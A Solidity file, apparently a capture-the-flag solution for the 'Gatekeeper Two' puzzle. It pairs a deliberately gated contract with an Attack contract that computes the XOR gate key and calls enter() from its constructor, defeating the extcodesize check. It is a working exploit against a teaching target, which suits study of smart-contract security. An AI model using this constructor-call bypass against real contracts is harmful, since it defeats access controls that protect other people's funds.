//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperTwo {

  address public entrant;
  address public entrant2;
  bool public checked;

  modifier gateOne() {
    require(msg.sender != tx.origin, "first gate");
    _;
  }

  modifier gateTwo() {
    uint x;
    assembly { x := extcodesize(caller()) }
    require(x == 0,"second gate");
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max, "third gate");
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    entrant2 = msg.sender;
    checked = true;
    return true;
  }
}

contract Attack {
  constructor () {
    address _addr = 0xd9145CCE52D386f254917e481eB44e9943F39138;
    bytes8 answer = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max);
    bytes memory encodedParams = abi.encodeWithSelector(bytes4(keccak256("enter(bytes8)")),answer);
    (bool success,) = address(_addr).call(encodedParams);
  }  
}